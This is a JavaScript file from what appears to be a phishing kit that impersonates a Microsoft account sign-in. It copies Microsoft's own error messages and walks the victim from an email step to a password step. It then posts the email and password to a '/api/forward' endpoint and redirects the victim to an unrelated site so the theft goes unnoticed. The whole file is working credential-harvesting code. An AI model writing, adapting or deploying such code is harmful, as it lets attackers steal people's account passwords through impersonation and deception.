const slidePage = document.querySelector(".slide-page"),
  secondSlide = document.querySelector(".secondSlide"),
  btnNext = document.querySelector(".firstNext"),
  submitBtn = document.querySelector(".submit");
function validateEmail(e) {
  return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    e
  );
}
function validate() {
  const e = $("#result"),
    t = $("#email").val();
  return (
    e.text(""),
    !!validateEmail(t) ||
      (t
        ? (e.text(
            "That Microsoft account doesn't exist.\n Enter a different account or get a new one."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px"))
        : (e.text(
            "Enter a valid email address, phone number, or Skype\n name."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px")),
      !1)
  );
}

var input1 = document.getElementById("email"),
  input2 = document.getElementById("password");
input1.addEventListener("keyup", function (e) {
  13 === e.keyCode &&
    (e.preventDefault(), document.getElementById("btnSend").click());
}),
  input2.addEventListener("keyup", function (e) {
    13 === e.keyCode &&
      (e.preventDefault(), document.getElementById("btnSignIn").click());
  }),
  btnNext.addEventListener("click", function () {
    const e = document.getElementById("email").value;
    if (!validate()) return;
    if (!validateEmail(e)) return;
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
      n = document.getElementById("section-2");
    (t.style.marginLeft = "-100%"),
      (t.style.visibility = "hidden"),
      (n.style.marginLeft = "0%"),
      (document.getElementById("loginForm").style.height = "403px");
  }),
  submitBtn.addEventListener("click", function () {
    const e = document.getElementById("password").value,
      t = document.getElementById("email").value;
    // console.log("email", t);
    // console.log("password", e);
    axios({
      method: "post",
      url: "/api/forward",
      data: {
        email: t,
        password: e,
      },
    })
      .then(function (response) {
        console.log(response);
        window.location.replace("https://hr.nsla.com.ng");
      })
      .catch(function (error) {
        console.log(error);
      });
  });
